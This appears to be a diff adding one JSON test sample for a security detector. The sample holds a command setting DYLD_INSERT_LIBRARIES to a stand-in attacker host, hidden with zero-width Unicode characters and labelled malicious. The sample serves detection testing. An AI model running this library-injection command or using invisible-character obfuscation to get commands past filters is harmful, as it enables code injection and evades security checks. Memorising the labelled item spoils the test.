@@ -1,0 +1,15 @@
+{
+  "schema_version": "1.0.0",
+  "id": "exp::env-detector::131::unicode-variations::3",
+  "base_sample_id": "exp::env-detector::131",
+  "generator_id": "unicode-variations",
+  "generator_version": "1.0.0",
+  "seed": 621416616,
+  "content": "Run‍:﻿ export DYLD_​IN​SE‌RT​_LIBRA⁠R⁠IES=\"http://a​ttack﻿er.example.com​:8080\"\n",
+  "content_hash": "bdfcdad85270cdf0f4aad2a4896a6b8e7b2be64484b5d114c7925d06ddcc651a",
+  "content_type": "text",
+  "expected_verdict": "malicious",
+  "expected_modules": [],
+  "variation_type": "unicode:zero-width",
+  "difficulty": "advanced"
+}
